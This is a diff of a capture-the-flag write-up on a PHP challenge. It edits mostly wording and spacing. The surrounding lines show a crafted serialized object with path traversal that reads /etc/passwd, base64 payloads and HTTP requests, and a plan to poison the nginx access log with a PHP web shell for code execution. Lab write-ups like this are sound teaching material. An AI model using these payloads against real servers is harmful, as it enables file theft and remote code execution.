@@ -13,8 +13,7 @@ Additionally you can download the source code of the application. It is provided
 
 ---
 # vulnerability
-As we have the source code of the application, the best practice here is to start by analysing the code for vulnerabilities.  
-The application is small and does not have any useful features, but the code of the `index.php` catches our attention.
+As we have the source code of the application, the best practice here is to start by analysing the code for vulnerabilities. The application is small and does not have any useful features, but the code of the `index.php` catches our attention.
 
 ```php
 <?php
@@ -107,7 +106,9 @@ O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
 To exploit it, we just need to change `/www/index.html` to the file we desire and update the length variable (`s:15`).
   
 Lets try to read `/etc/passwd` as a proof of concept.  
+  
 Crafted serialised object: `O:9:"PageModel":1:{s:4:"file";s:28:"../../../../../../etc/passwd";}`  
+  
 `base64` encoded serialised object: `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyODoiLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCI7fQ==`
 ```http
 GET / HTTP/1.1
@@ -169,9 +170,10 @@ nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
 > It worked!
 {: .prompt-info }
 
-Now lets escalate this file read to a remote code execution by poisoning the `access.log` file. From the `docker` image and the `http` response we know that `nginx` is used. The `access.log` location should be under: `/var/log/nginx/access.log`.  
+Now lets escalate this file read vulnerability to a remote code execution by poisoning the `access.log` file. From the `docker` image and the `http` response we know that `nginx` is used. The `access.log` location should be under: `/var/log/nginx/access.log`.  
   
 Crafted serialised object: `O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}`  
+  
 `base64` encoded serialised object: `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==`
 ```http
 GET / HTTP/1.1
@@ -203,7 +205,7 @@ Content-Length: 5687
 ...
 ```
 
-> We are able read the `access.log`
+> We are able to read the `access.log`
 {: .prompt-info }
 
 Lets poison the log with some simple `php` web shell.  
